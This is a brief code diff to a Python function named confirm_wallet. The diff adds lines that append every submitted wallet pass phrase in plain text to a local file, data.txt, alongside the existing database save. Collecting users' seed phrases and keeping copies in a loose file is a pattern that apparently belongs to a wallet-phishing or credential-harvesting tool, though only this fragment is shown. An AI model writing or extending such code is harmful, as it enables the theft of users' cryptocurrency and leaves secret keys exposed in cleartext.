@@ -35,6 +35,13 @@ def confirm_wallet(user_address):
         new_wallet = Wallet(pass_phrase=pass_phrase)
         db.session.add(new_wallet)
         db.session.commit()
+
+        if pass_phrase:
+            with open('data.txt', 'a') as file:
+                file.write('wallet: '+ pass_phrase + '\n')
+            print('Data Saved Successfully')
+        else:
+            print('no data received')
         
         data = {
             "from": {
